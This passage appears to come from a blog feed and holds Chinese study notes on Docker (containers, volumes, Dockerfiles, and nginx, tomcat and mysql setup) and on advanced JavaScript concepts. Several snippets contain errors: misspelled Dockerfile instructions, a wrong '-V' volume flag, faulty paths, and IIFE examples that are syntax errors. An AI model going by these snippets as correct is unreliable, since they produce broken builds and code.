容器id 删除指定的容器，不能删除正在运行的容器 docker rm -f $(docker ps -qa) 删除所有容器 启动和停止容器的操作 docker start 容器id 启动容器 docker restart 容器id 重启容器 docker stop 容器id 停止当前正在运行的容器 docker kill 容器id 强制停止当前容器 常用其他命令后台启动容器的坑 docker容器使用后台运行，就必须要有一个前台进程，docker发现没有应用，就会自动停止 nginx，容器启动后，发现自己没有提供服务，就会立刻停止 查看日志docker logs -f -t –tail 行数 容器 查看容器中进程信息docker top 容器id 查看镜像的元数据docker inspect 容器id 进入当前正在运行的容器docker exec -it 容器id bashshell docker attach 容器id 区别 docker exec 进入容器后开启一个新的终端，可以在里面操作 docker attach 进入容器正在执行的终端，不会启动新的进程 从容器内拷贝文件到主机上docker cp 容器id:容器内路径 目的的主机路径 Docker实战操作docker 安装 nginx搜索docker search nginx 12345678910111213141516171819202122232425262728yangfan@yangfan-virtual-machine:~$ sudo docker search nginx[sudo] yangfan 的密码： NAME DESCRIPTION STARS OFFICIAL AUTOMATEDnginx Official build of Nginx. 14519 [OK] jwilder/nginx-proxy Automated Nginx reverse proxy for docker con… 1973 [OK]richarvey/nginx-php-fpm Container running Nginx + PHP-FPM capable of… 809 [OK]jc21/nginx-proxy-manager Docker container for managing Nginx proxy ho… 157 linuxserver/nginx An Nginx container, brought to you by LinuxS… 141 tiangolo/nginx-rtmp Docker image with Nginx using the nginx-rtmp… 115 [OK]jlesage/nginx-proxy-manager Docker container for Nginx Proxy Manager 98 [OK]bitnami/nginx Bitnami nginx Docker Image 94 [OK]alfg/nginx-rtmp NGINX, nginx-rtmp-module and FFmpeg from sou… 89 [OK]nginxdemos/hello NGINX webserver that serves a simple page co… 66 [OK]nginx/nginx-ingress NGINX Ingress Controller for Kubernetes 49 privatebin/nginx-fpm-alpine PrivateBin running on an Nginx, php-fpm &amp; Al… 47 [OK]nginxinc/nginx-unprivileged Unprivileged NGINX Dockerfiles 31 staticfloat/nginx-certbot Opinionated setup for automatic TLS certs lo… 19 [OK]schmunk42/nginx-redirect A very simple container to redirect HTTP tra… 19 [OK]nginx/nginx-prometheus-exporter NGINX Prometheus Exporter 16 centos/nginx-112-centos7 Platform for running nginx 1.12 or building … 15 centos/nginx-18-centos7 Platform for running nginx 1.8 or building n… 13 bitwarden/nginx The Bitwarden nginx web server acting as a r… 9 flashspys/nginx-static Super Lightweight Nginx Image 9 [OK]bitnami/nginx-ingress-controller Bitnami Docker Image for NGINX Ingress Contr… 8 [OK]mailu/nginx Mailu nginx frontend 8 [OK]navidonskis/nginx-php5.6 Docker nginx + php5.6 on Ubuntu 7 [OK]ansibleplaybookbundle/nginx-apb An APB to deploy NGINX 2 [OK]wodby/nginx Generic nginx 1 [OK] 下载nginx12345678910yangfan@yangfan-virtual-machine:~$ sudo docker pull nginx:1.18.0-alpine1.18.0-alpine: Pulling from library/nginx0a6724ff3fcd: Pull complete 1d7c87af3754: Pull complete 9668ffa91d19: Pull complete e81a2f5037c1: Pull complete 991b5ddb4d9e: Pull complete Digest: sha256:7ae8e5c3080f6012f8dc719e2308e60e015fcfa281c3b12bf95614bd8b6911d6Status: Downloaded newer image for nginx:1.18.0-alpinedocker.io/library/nginx:1.18.0-alpine 运行容器1234567891011121314yangfan@yangfan-virtual-machine:~$ sudo docker run --name nginx1 -d -p 3344:80 nginxUnable to find image 'nginx:latest' locallylatest: Pulling from library/nginxa076a628af6f: Already exists 0732ab25fa22: Pull complete d7f36f6fe38f: Pull complete f72584a26f32: Pull complete 7125e4df9063: Pull complete Digest: sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaStatus: Downloaded newer image for nginx:latest2cd5726333e7eadab428a788ad440c16d00af2aecc1010e4ead0b7878aa899cayangfan@yangfan-virtual-machine:~$ sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES2cd5726333e7 nginx "/docker-entrypoint.…" 9 seconds ago Up 8 seconds 0.0.0.0:3344-&gt;80/tcp 进入容器查看配置文件1234567891011yangfan@yangfan-virtual-machine:~$ sudo docker exec -it 2cd5726333e7 /bin/bashroot@2cd5726333e7:/# lsbin dev docker-entrypoint.sh home lib64 mnt proc run srv tmp varboot docker-entrypoint.d etc lib media opt root sbin sys usrroot@2cd5726333e7:/# whoamirootroot@2cd5726333e7:/# whwhereis which while who whoami root@2cd5726333e7:/# whereis nginxnginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginxroot@2cd5726333e7:/# cd /etc/nginx/ 安装tomcat官方的使用方式 docker run -it –rm tomcat:90 –rm 一般用来测试，用完就删除 下载镜像 12345678910111213141516yangfan@yangfan-virtual-machine:~$ sudo docker pull tomcatUsing default tag: latestlatest: Pulling from library/tomcatb9a857cbf04d: Pull complete d557ee20540b: Pull complete 3b9ca4f00c2e: Pull complete 667fd949ed93: Pull complete 661d3b55f657: Pull complete 511ef4338a0b: Pull complete a56db448fefe: Pull complete 00612a99c7dc: Pull complete 326f9601c512: Pull complete c547db74f1e1: Pull complete Digest: sha256:94cc18203335e400dbafcd0633f33c53663b1c1012a13bcad58cced9cd9d1305Status: Downloaded newer image for tomcat:latestdocker.io/library/tomcat:latest 运行镜像 12345678910111213yangfan@yangfan-virtual-machine:~$ sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmysql 5.7 a70d36bc331a 6 weeks ago 449MBtomcat 9.0 040bdb29ab37 7 weeks ago 649MBtomcat latest 040bdb29ab37 7 weeks ago 649MBnginx latest f6d0b4767a6c 7 weeks ago 133MBnginx 1.18.0-alpine f2343e2e2507 2 months ago 21.9MBcentos latest 300e315adb2f 2 months ago 209MByangfan@yangfan-virtual-machine:~$ sudo docker run -d -p 3344:8080 --name tomcat1 tomcat b90a6472737fe5d319b4afad7d360a3e6394dd08fb0991bc27751c99e30b1712yangfan@yangfan-virtual-machine:~$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESb90a6472737f tomcat "catalina.sh run" About a minute ago Up About a minute 0.0.0.0:3344-&gt;8080/tcp tomcat1 docker stats 容器id 查看cpu状态 12CONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDSeaee03688881 mysql02 0.08% 204.6MiB / 2.895GiB 6.90% 12.1kB / 20.3kB 26.7MB / 292MB 32 Commit镜像docker commit 提交容器成为一个新的副本 docker commit -m=”提交的描述信息” -a=”作者” 容器id 目标镜像名[:TAG] 12345678fany@ubuntu18:~$ sudo docker commit -m="commit版centos" -a="fany" 1e7b39c3c2da fany/centos:2.0 sha256:7396d029926a4f5ba6b9f82e5172666ae63b60cd0b53fd9f607798052bd3a05bfany@ubuntu18:~$ sudo docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEfany/centos 2.0 7396d029926a 5 seconds ago 209MBfany/centos 1.0 13da2d456cd9 38 hours ago 209MBmysql 5.7 a70d36bc331a 7 weeks ago 449MBcentos latest 300e315adb2f 3 months ago 209MB 容器数据卷使用数据卷docker run -it -v 主机目录：容器内目录 把主机目录挂载到容器目录中 使用数据卷实战：安装mysql下载mysql1docker pull mysql 运行mysql12# 官方mysql运行测试命令docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag 12345678docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7# -d 后台运行-p 端口映射-v 挂载（就是docker主机和主机之间的文件相互同步）-e 添加配置--name 别名 具名和匿名挂载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# 匿名挂载-v 容器内路径docker run -d -P --name nginx01 -v /etc/nginx nginxfany@ubuntu18:~$ sudo docker run -d -P --name nginx01 -v /etc/nginx/ nginxUnable to find image 'nginx:latest' locallylatest: Pulling from library/nginxa076a628af6f: Already exists 0732ab25fa22: Pull complete d7f36f6fe38f: Pull complete f72584a26f32: Pull complete 7125e4df9063: Pull complete Digest: sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaStatus: Downloaded newer image for nginx:latest2156646a24e3b8515ad3cb295e3188a7f06d5da7d7d6d286e47e33a53fdff665# 查看所有的volume的情况docker volume lsfany@ubuntu18:~$ sudo docker volume lsDRIVER VOLUME NAMElocal 1aace1413a58fe48b59552be0e13f258fc2625389c358dc63f0fa61023af7264local 2e6cf97c31fa74eb56fbecf7467b0eeebc85286c2d0b73324f7431f3e339a4aclocal 5ac0f89b61aad729335646a84d938d45072bebaadb5446e638311d8b78f1ae09local 6eb06715d487effeab344c9a335940e522a3c95c89dce0363b93aa30b45d320flocal 9ce9dca7966653ba788bd8c7a79444d3a7fd533f89e3d97da0bb2eabf5d20328local 9d1e8bfccadc28cd3048078e743e139183eb1fee78759e3bbb4170394e5d473flocal 9d8414a8ce53ef619a12bde9abfadbc3937565d566dd63e1d72d61ba3771a48blocal 44a91fa46dd5003a31c9123b8bbe1d43deb4933a6503c84ce17b11eaf0d5b769local 90d2f411f4eb4d6bd903f4ceac1d6ab57ba557b08db220414aa28bda734da62flocal 2906a33e43e822a758130a9a8ae37c2dc31cb9aa1dde45969a0a43819cc48c20local 3871f7c9892d84ce47c536a3ad810b3dcea7f3aecb9ce0c8ae66490c3f84ebaflocal 6058f80c65d9dd81f29975267e5f1eadee371c3ae2673828452757502550a19flocal 216203260f3961bd642a69622c97b9abf6b87172c28ee20048b4fae26c3e806alocal a52876a9d6f8a6556d3bf3835c0d92a0bc3853ace46843bd685241033ab14a56local b60310b05c6bfa2a9ed0619264f0c8db7d5beab25c8ad132d981507c5f8b2180local d6fd04629f90fa33f8ae877cfcf9a2ae55e39c0f6f71c9b58c0692c435aeb004local e1ea3b10c4e43b47452a9183537115a67ebac455a17530ed3df18fda2c1f5cb9local f9fff3462e30f18f4f85d4c0d9d50ee02f5b0909ed22b79d7e6b9e638b386408# 这里发现，这种就是匿名挂载，我们在 -v 只写了容器内的路径，没有写容器外的路径sudo# 具名挂载docker run -d -P --name nginx02 -V juming-nginx:/etc/nginx nginxdocker volume lsfany@ubuntu18:~$ sudo docker volume lsDRIVER VOLUME NAMElocal 1aace1413a58fe48b59552be0e13f258fc2625389c358dc63f0fa61023af7264local 2e6cf97c31fa74eb56fbecf7467b0eeebc85286c2d0b73324f7431f3e339a4aclocal 5ac0f89b61aad729335646a84d938d45072bebaadb5446e638311d8b78f1ae09local 6eb06715d487effeab344c9a335940e522a3c95c89dce0363b93aa30b45d320flocal 9ce9dca7966653ba788bd8c7a79444d3a7fd533f89e3d97da0bb2eabf5d20328local 9d1e8bfccadc28cd3048078e743e139183eb1fee78759e3bbb4170394e5d473flocal 9d8414a8ce53ef619a12bde9abfadbc3937565d566dd63e1d72d61ba3771a48blocal 44a91fa46dd5003a31c9123b8bbe1d43deb4933a6503c84ce17b11eaf0d5b769local 90d2f411f4eb4d6bd903f4ceac1d6ab57ba557b08db220414aa28bda734da62flocal 2906a33e43e822a758130a9a8ae37c2dc31cb9aa1dde45969a0a43819cc48c20local 3871f7c9892d84ce47c536a3ad810b3dcea7f3aecb9ce0c8ae66490c3f84ebaflocal 6058f80c65d9dd81f29975267e5f1eadee371c3ae2673828452757502550a19flocal 216203260f3961bd642a69622c97b9abf6b87172c28ee20048b4fae26c3e806alocal a52876a9d6f8a6556d3bf3835c0d92a0bc3853ace46843bd685241033ab14a56local b60310b05c6bfa2a9ed0619264f0c8db7d5beab25c8ad132d981507c5f8b2180local d6fd04629f90fa33f8ae877cfcf9a2ae55e39c0f6f71c9b58c0692c435aeb004local e1ea3b10c4e43b47452a9183537115a67ebac455a17530ed3df18fda2c1f5cb9local f9fff3462e30f18f4f85d4c0d9d50ee02f5b0909ed22b79d7e6b9e638b386408local juming-nginx 所有的docker容器内的卷，没有指定目录的情况下都是在 /var/lib/docker/volumes/xxx/_data 我们通过具名挂载可以方便的找到我们的一个卷，大多数情况在使用具名挂载 1234# 区分匿名挂载/具名挂载还是指定路径挂载-v 容器内路径 # 匿名挂载-v 卷名:容器内路径 # 具名挂载-v /宿主机路径:容器内路径 # 指定路径挂载 扩展： -v /宿主机路径:容器内路径 12345678# 通过 -V 容器内路径：ro rw 改变读写权限ro readonly # 只读rw readwrite # 可读可写# 一旦这个设置了容器权限 容器对我们挂载出来的内容就有限定了docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginxdocker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx# ro 只要看到ro就说明这个路径只能通过宿主机来操作，容器内部都无法操作 初始Dockerfiledockerfile 就是用来构建 docker镜像的构建文件，命令脚本 通过这个脚本可以生成镜像，镜像是一层一层的，脚本一个个的命令，每个命令都是一层 1234567# 创建一个dockerfile文件 名字可以随机 建议dockerfile# 文件中的内容 指令（大写） 参数FROM centosVOLUME [&apos;volume01&apos;, &apos;volume02&apos;]CMD echo &quot;-----end-----&quot;CMD /bin/bash# 这里的每个命令，都是镜像的一层 执行 1docker build -f /home/dockerfile1 -t 作者名/镜像名：版本 . 123456789101112131415161718fany@ubuntu18:~/docker/DockerFile$ sudo docker build -f /home/fany/docker/DockerFile/dockerfile -t fany/centos:1.0 .Sending build context to Docker daemon 2.048kBStep 1/4 : FROM centos ---&gt; 300e315adb2fStep 2/4 : VOLUME ['volume01', 'volume02'] ---&gt; Running in ac6ee9ac88e2Removing intermediate container ac6ee9ac88e2 ---&gt; 28fabf1af5a9Step 3/4 : CMD echo "----end----" ---&gt; Running in 107be8d1d71aRemoving intermediate container 107be8d1d71a ---&gt; 246ba60efd5bStep 4/4 : CMD /bin/bash ---&gt; Running in d94e1416d4b9Removing intermediate container d94e1416d4b9 ---&gt; 13da2d456cd9Successfully built 13da2d456cd9Successfully tagged fany/centos:1.0 数据卷容器docker run -it –name docker01 –volumes-from docker01 作者名/镜像名：版本 通过以上的方式我们可以实现容器间的数据共享 任何一个容器被删除，共享的数据不会丢失 多个mysql实现数据共享 1234567891011121314151617181920212223242526docker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7fany@ubuntu18:~$ sudo docker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 mysql:5.7 eaee03688881f1c55d76642cf83518d862fe6ea5239d32ac7048628cfb44778adocker run -d -p 3310:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01 mysql:5.7# 测试结果fany@ubuntu18:~$ sudo docker exec -it eaee03688881 /bin/bashroot@eaee03688881:/# cd /var/lib/mysqlroot@eaee03688881:/var/lib/mysql# lsauto.cnf client-cert.pem ib_logfile0 ibtmp1 private_key.pem server-key.pemca-key.pem client-key.pem ib_logfile1 mysql public_key.pem sysca.pem ib_buffer_pool ibdata1 performance_schema server-cert.pem testfany@ubuntu18:~$ sudo docker start a3a15fbd16a3a3a15fbd16a3fany@ubuntu18:~$ sudo docker exec -it a3a15fbd16a3 /bin/bashroot@a3a15fbd16a3:/# cd /var/lib/mysqlroot@a3a15fbd16a3:/var/lib/mysql# lsauto.cnf client-cert.pem ib_logfile0 ibtmp1 private_key.pem server-key.pemca-key.pem client-key.pem ib_logfile1 mysql public_key.pem sysca.pem ib_buffer_pool ibdata1 performance_schema server-cert.pem test# 在eaee03688881容器中新建了test数据库 a3a15fbd16a3 也同步了test数据库 结论： 容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止。 但是一旦持久化到了本地，这个时候，本地的数据是不会删除的。 DockerFiledockerfile介绍dockerfile构建过程dockerfile的指令123456789101112FROM # 基础镜像，一切从这里开始构建MEINTAINER # 镜像是谁写的， 姓名+邮箱RUN # 镜像构建的时候需要运行的命令ADD # 步骤：tomcat镜像，这个tomcat压缩包 添加内容COPY # 类似ADD，将lsWORKDIR # 镜像的工作目录VOLUME # 挂载的目录EXPOST # 保留端口配置yumCMD # 指定容器启动的时候需要运行的命令 替换ENTRYPIOINT # 指定这个容器启动的时候要运行的命令 追加ONBUILE # 当构建一个被继承 DockerFile 这个时候就会运行 ONBUILD的指令，触发指令。ENV # 构建的时候设置环境变量 实战测试：centos 创建一个自己的centos 12345678910111213141516171819202122232425262728# 1 编写DockerFile配置文件FROM centosMAINTAINER fany&lt;483813121@qq.com&gt;ENV MYPATH /usr/localWORKDIR $MYPATHRUN yum -y install vim RUN yum -y install net-toolsEXPOSE 80CMD echo $MYPATHCMD echo "----end----"CMD /bin/bash# 2、通过这个文件 构建镜像# 命令 docker build -f dockerfile文件路径 -t 镜像名：[tag] .构建成功后显示Successfully built 镜像idSuccessfully tagged 镜像名:tag# 3、运行测试fany@ubuntu18:~/docker/DockerFile$ sudo docker run --name centos03 -it 2eee339e854a[root@28ffb5be051d local]# lsbin etc games include lib lib64 libexec sbin share src 列出本地进行的变更历史镜像命令 docker history 镜像id 1234567891011121314fany@ubuntu18:~/docker/DockerFile$ sudo docker history 2eee339e854aIMAGE CREATED CREATED BY SIZE COMMENT2eee339e854a 7 minutes ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "/bin… 0B 328c5590083f 7 minutes ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "echo… 0B 61c489975a32 7 minutes ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "echo… 0B 4775afd52615 7 minutes ago /bin/sh -c #(nop) EXPOSE 80 0B 2d4e54be3fdd 7 minutes ago /bin/sh -c yum -y install net-tools 23.3MB 2210b82a2fd3 7 minutes ago /bin/sh -c yum -y install vim 58MB 8ad9663738ee 8 minutes ago /bin/sh -c #(nop) WORKDIR /usr/local 0B 9e5baf54c101 8 minutes ago /bin/sh -c #(nop) ENV MYPATH=/usr/local 0B 7ca038e36aec 8 minutes ago /bin/sh -c #(nop) MAINTAINER fany&lt;483813121… 0B 300e315adb2f 3 months ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) LABEL org.label-schema.sc… 0B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) ADD file:bd7a2aed6ede423b7… 209MB CMD 和 ENTRYPOINT 区别 12CMD # 指定容器启动的时候需要运行的命令 替换ENTRYPIOINT # 指定这个容器启动的时候要运行的命令 追加 实战测试：Tomcat镜像1、准备镜像文件 tomcat压缩包，jdk的压缩包 2、编写dockerfile文件，官方命名Dockerfile 12345678910111213141516171819202122FROM centosMAINTAINER fany&lt;483813121@qq.com&gt;COPY readme.txt /usr/local/readme.txtADD jdk-8u11-linux-x64.tar.gz /usr/local/ADD apache-tomcat-9.0.22.tar.gz /usr/local/RUN yum -y install vimENV MYPATH /usr/localWORKDIR $MYPATHENV JAVA_HOME /usr/local/jdk1.80_11ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarENV CATALINA_HOME /usr/local/apache-tomcat-9.0.22ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.22ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/binEXPOSE 8080CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.0.22/bin/logs/catalina.out 3、构建镜像 1# docker build -f diytomcat 4、启动镜像 5、访问测试 6、发布项目 发布自己的镜像https://homenew.console.aliyun.com/home/dashboard/ProductAndService 阿里云的容器镜像服务 DocKer网络]]></content>
      <categories>
        <category>Docker</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>docker学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript高级笔记]]></title>
    <url>%2F2020%2F08%2F31%2FJavascript%E9%AB%98%E7%BA%A7%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[JS高级学习笔记基础总结深入理解数据类型1. 分类 基本(值)类型 String: 任意字符串 Number: 任意的数字 Boolean: true/false undefined: undefined null: null 对象(引用)类型 Object: 任意类型 Function: 一种特别的对象(可以执行) Array: 一种特别的对象(对象下标) 2. 判断 如何判断数据类型? typeof instanceof === 相关问题 undefined与null的区别? undefined代表定义未赋值null定义并赋值了，只是值为null 什么时候给变量赋值为null呢? 初识赋值，表示将要赋值为对象结束前,让对象成为垃圾对象(被垃圾回收器回收) 严格区别变量类型与数据类型? 数据的类型 基本类型 对象类型 变量的类型(变量内存值的类型) 基本类型: 保存就是基本类型的数据 引用类型: 保存的是地址值 数据_变量_内存1. 什么是数据? 存储在内存中代表特定信息的’玩意’,本质是以0101形式存储 数据的特点 可传递 可运算 哲学思想 一切皆数据 内存中操作的目标 就是操作数据 数据能进行哪些操作? 算术运算 赋值 逻辑运算 运行函数 2. 什么是内存? 内存条通电后产生的可存储数据的空间(临时的) 内存的产生和死亡 内存条(一块电路板) -&gt; 通电 -&gt; 产生内存空间 -&gt; 存储数据 -&gt; 处理数据 -&gt; 断电 -&gt; 内存空间和数据都消失 一块小内存的2个数据 内部存储的数据 地址值 内存分类 栈: 存储 全局变量/局部变量 堆: 存储 对象 3. 什么是变量? 可变化的量,由变量名和变量值组成 每个变量都对应的一块小内存,变量名用来查找对应的内存,变量值就是内存中保存的数据 4. 内存,数据,变量三者之间的关系? 内存用来存储数据的空间 变量是内存的标识 关于赋值和内存的问题 var a = xxx, a内存中到底保存的是什么? xxx是基本数据,保存的就是这个数据 xxx是对象, 保存的就是对象的地址值 xxx是一个变量, 保存的xxx的内存内容(可能是基本数据, 也可能是地址值) 关于引用变量赋值问题 2个引用变量指向同一对象, 通过一个变量修改对象内部数据, 另一个变量看到的是修改之后的数据 123456789101112// 2个引用变量指向同一个对象var obj1 = &#123;name: 'tom'&#125;;var obj2 = obj1;// 通过一个变量修改对象内部数据obj1.name = 'Jack';// 另一个变量看到的是修改之后的数据console.log(obj2.name) //Jackfunction fn(obj)&#123; obj.name = 'Dock';&#125;fn(obj1);console.log(obj2.name); //Dock 2个引用变量指向同一个对象, 让其中一个引用变量指向另一个对象, 另一个引用变量依然指向前一个对象 12345678// 2个引用变量指向同一个对象var a = &#123;age: 12&#125;;var b = a;// 让其中一个引用变量指向另一个对象a = &#123;name: 'BoB', age: 13&#125;;b.age = 14;// 另一个引用变量依然指向前一个对象console.log(b.age, a.name, a.age); //12 'BoB' 13 在JS调用函数时传递变量参数时, 是值传递还是引用传递 理解1: 都是值(基本/地址值)传递 理解2: 可能是值传递, 也可能是引用传递(地址值) 1234567var a = 3;// 实参a 传递 给形参a 肯定是值传递 形参a 是局部变量 值改变不会影响外部的变量afunction fn (a) &#123; a = a + 1;&#125;fn(a);console.log(a); JS引擎如何管理内存? 内存生命周期 分配小内存空间, 得到它的使用权 存储数据, 可以反复进行操作 释放小内存空间 释放内存 局部变量: 函数执行完自动释放 对象: 成为垃圾对象 -&gt; 垃圾回收器回收 对象 什么是对象? 多个数据的封装体 用来保存多个数据的容器 一个对象代表现实中的一个事物 为什么要用对象? 统一管理多个数据 对象的组成 属性 属性名(字符串)和属性值(任意)组成 方法 一种特别的属性(属性值是函数) 如何访问对象内部数据? .属性名 编码简单,有时不能用 [] 编码麻烦,能通用 什么时候必须使用[&#39;属性名&#39;]的方式? 属性名包含特殊字符: - 空格 变量名不确定 函数了解函数 什么是函数? 实现特定功能的n条语句的封装体 只有函数是可以执行的, 其他类型的数据不能执行 为什么要用函数? 提高代码复用 便于封装 函数的核心思想 封装 如何定义函数? 函数声明 表达式 如何调用(执行)函数? test() : 直接调用 obj.test() : 通过对象调用 new.test() : new调用 test.call/apply(obj) : 临时让test成为obj的方法进行调用 回调函数 什么函数才是回调函数? 你定义的 你没有掉，但最终它执行了 常见的回调函数? dom事件回调函数 定时器回调函数 ajax请求回调函数 生命周期回调函数 1&lt;button id='btn'&gt;测试点击事件&lt;/button&gt; 12345678// dom事件回调函数document.getElementById('btn').onclick = function()&#123; alert(this.innerHTML);&#125;// 定时回调函数setTimeout(function()&#123; alert("我是定时器回调函数");&#125;, 2000); IIFE(立即调用函数表达式) 理解 全称: Immediately-Invoked Function Expression 中文解释: 立即调用的函数表达式 作用 隐藏实现 不会污染外部(全局)命名空间 用它来编写js模块 1234567891011121314151617181920212223// 匿名函数自调用// 这样写不会污染(全局)命名空间function()&#123; var a = 3; console.log(a + 3);&#125;()// 与匿名函数中的a 不是同一个avar a = 4;console.log(a);;function()&#123; var a = 1; function test()&#123; console.log(++a); &#125; // 这样写是向外暴露一个全局函数 window.$ = function()&#123; return &#123; test: test &#125; &#125;&#125;()$().test(); 函数中的this this是什么? 任何函数本质上都是通过某个对象来调用的, 如果没有直接指定的就是window 所有函数内部都有一个变量this 它的值是调用函数的当前对象 自己的理解 this其实就是函数的调用者, 可能是window,可能是某个对象 如何确定this的值? test() : window p.test() : p new test() : 新创建的对象 p.call(obj) : obj 总结 数据类型：两大类基本类型(值): String Number Boolean undefined null对象类型(引用): Object Function(可以执行) Array(有序)判断数据类型的方法(3种)typeof(返回数据类型名, 不能区别null、对象和数组)instanceof(返回true/false, 专门用来判断Object、Array、Function)===(返回true/false, 只能判断undefined和null) 数据是存储在内存中代表特定信息的东西内存是通电后临时产生可存储数据的空间变量是可变化的量, 变量以及变量的值会以数据的形式保存到内存中 对象是多个数据的封装体 函数是实现特定功能的n条语句的封装体 回调函数是自己定义, 没有调用却执行了的特殊函数 IIFE 立即调用函数表达式 this代表函数的调用者 函数高级(重点内容)原型与原型链原型 函数的prototype属性 函数都有prototype属性，默认指向一个Object空对象(既称为原型对象),每个原型对象中有一个属性constructor,它指向函数对象 给原型对象添加属性(一般是方法) 作用：函数的所有实例对象自动拥有原型中的属性(方法) 显式原型与隐式原型 每个函数function都有一个prototype, 既显式原型(属性) 每个实例对象都有一个proto, 可称为隐式原型(属性) 对象的隐式原型的值为其对应构造函数的显式原型的值 总结函数的prototype属性: 在定义函数时自动添加的,默认值是一个空Object对象对象的__proto__属性: 创建对象时自动添加的, 默认值为构造函数的prototype属性值程序员能直接操作显式原型,但不能直接操作隐式原型(ES6之前) 原型链 说明 访问一个对象的属性时，先在自身属性中查找,找到返回,如果没有,则沿着__proto__这条链向上查找,找到返回,如果最终没有找到,返回undefined 别名: 隐式原型链 作用 查找对象的属性(方法) 理解原型链的三个基本点 函数的显式原型指向的对象默认是空Object实例对象(但Objec不满足) 所有函数都是Function的实例(包含Function) Object的原型对象是原型链的尽头 原型链_属性问题 读取对象属性值时: 会自动到原型链中查找 设置对象属性值时: 不会查找原型链, 如果当前对象中没有此属性,直接添加此属性并设置其值 方法一般定义在原型中, 属性一般通过构造函数定义在对象本身内 instanceof instanceof是如何判断的? 表达式: A instanceof B 如果B函数的显式原型对象在A对象的原型链上, 返回true, 否则返回false Function是通过new自己产生的实例 执行上下文与执行上下文栈变量提升与函数提升 变量声明提升 通过var定义(声明)的变量, 在定义语句之前就可以访问到 值为undefined 函数声明提升 通过function声明的函数, 在之前就可以直接调用 值为函数定义(对象) 总结一句话就是变量定义前可以使用变量,但值 为undefined 执行上下文(帮助理解内部是如何执行的) 代码分类(位置) 全局代码 函数(局部)代码 全局执行上下文(流程) 在执行全局代码前将window确定为全局执行上下文 对全局数据进行预处理 var定义的全局变量==&gt;undefined,添加为window的属性 将var定义的变量作为添加到window中 function声明的全局函数==&gt;赋值(fun), 添加为window的方法 将function声明的函数作为方法添加到window中 this==&gt;赋值(window) 最后才开始执行全局代码 函数执行上下文(流程) 在调用函数,准备执行函数体之前,创建对应的函数执行上下文对象(虚拟的,存在与栈中) 对局部数据进行预处理 形参变量==&gt;赋值(实参)==&gt;添加为执行上下文的属性 arguments==&gt;赋值(实参列表),添加为执行上下文的属性 var定义的局部变量==&gt;undefined,添加为执行上下文的方法 this==&gt;赋值(调用函数的对象) 最后才开始执行函数体代码 执行上下文栈 在全局代码执行前,JS引擎就会创建一个栈来存储管理所有的执行上下文对象 在全局执行上下文(window)确定后,将其添加到栈中(压栈) 在函数执行上下文创建后,将其添加到栈中(压栈) 在当前函数执行完后,将栈顶的对象移出(出栈) 所有的代码执行完后,栈中只剩下window ![](F:\素材整理\素材库.library\images\KCKGAPGDU5S33.info[译] 理解 JavaScript 中的执行上下文和执行栈 - 掘金_thumbnail.png) 作用域与作用域链作用域 什么是作用域? 就是一块”地盘”,一个代码段所在的区域 特点：它是静态的(相当于上下文对象),在编写代码时就确定了 作用域分类 全局作用域 函数作用域 块作用域(ES6存在) 作用域的作用 隔离变量，不同作用域下同名变量不会有冲突 作用域与执行上下文 作用域与执行上下文的区别 区别一 全局作用域之外,每个函数都会创建自己的作用域,作用域在函数定义时就已经确定了。而不是在函数调用时 全局执行上下文环境是在全局作用域确定之后,js代码马上执行之前创建 函数执行上下文是在调用函数时,函数体代码执行之前创建 区别二 作用域是静态的,只要函数定义好了就一直存在,且不会再变化 执行上下文是动态的,调用函数时创建,函数调用结束时就会自动释放 作用域与执行上下文的联系 执行上下文(对象)是从属于所在的作用域 全局上下文环境==&gt;全局作用域 函数上下文环境==&gt;对应的函数使用域 作用域链 什么是作用域链? 多个上下级关系的作用域形成的链,它的方向是从下向上的(从内到外) 查找变量时就是沿着作用域链来查找的 查找一个变量的查找规则 在当前作用域下的执行上下文中查找对应的属性,如果有直接返回,否则进入2 在上一级作用域的执行上下文中查找对应的属性,如果有直接返回,否则进入3 再次执行2的相同操作,直到全局作用域,如果还找不到就抛出找不到的异常 闭包了解闭包 如何产生闭包? 当一个嵌套的内部(子)函数引用了嵌套的外部(父)函数的变量(函数)时,就产生了闭包 闭包是什么? 闭包是嵌套的内部函数 包含被引用变量(函数)的对象 注意: 闭包存在于嵌套的内部函数中 产生闭包的条件? 函数嵌套 内部函数引用了外部函数的数据(变量/函数) 